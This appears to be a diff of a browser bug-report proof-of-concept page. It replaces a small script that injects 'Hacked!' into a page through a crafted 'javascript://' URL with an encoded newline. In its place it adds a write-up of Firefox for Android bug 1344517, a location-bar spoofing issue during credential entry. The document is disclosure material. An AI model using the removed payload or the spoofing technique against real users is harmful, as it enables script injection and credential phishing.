@@ -1,9 +1,15 @@
-<script>
-function a(){
-	window.open("abcd://google.com", "x");
-	setTimeout(function(){
-		window.open("javascript://google.com/search?q=google.com&source=/%0adocument.body.innerHTML='%3ch1%20style=color:red%3eHacked!'", "x");
-	}, 111);
-}
-</script> 
-<center><img src="https://pwning.click/Genius_Cat.jpg" onclick="a()"></center>
+<html>
+<head>
+<title>Bug1344517</title>
+</head>
+<body>
+<h4><u><font color="#0B4C5F" face="Verdana">Bug 1344517 - Firefox for Android:</font></u></h4>
+<b>Location Bar Spoofing Risk - The Location Bar remains hidden when the user manually scrolls down 
+<br>and another website is loaded during this scroll event</b>
+<br><u>(Patch for Bug 1293463 doesn't prevent completely Location Bar Spoofing risks)</u>
+<br>
+<font color="gold" style="background-color: black" face="Verdana">Results:</font>
+<p><font color="white" style="background-color: black" face="Verdana">The fake location bar continue to be displayed and <br>the real location bar remains hidden <br>during the writing of user credentials by a numeric keypad or a web virtual keyboard.</font><p>
+<iframe width="700" height="380" src="https://www.youtube.com/embed/K1F4-v3AQe8" frameborder="0" allowfullscreen></iframe>
+</body>
+</html>
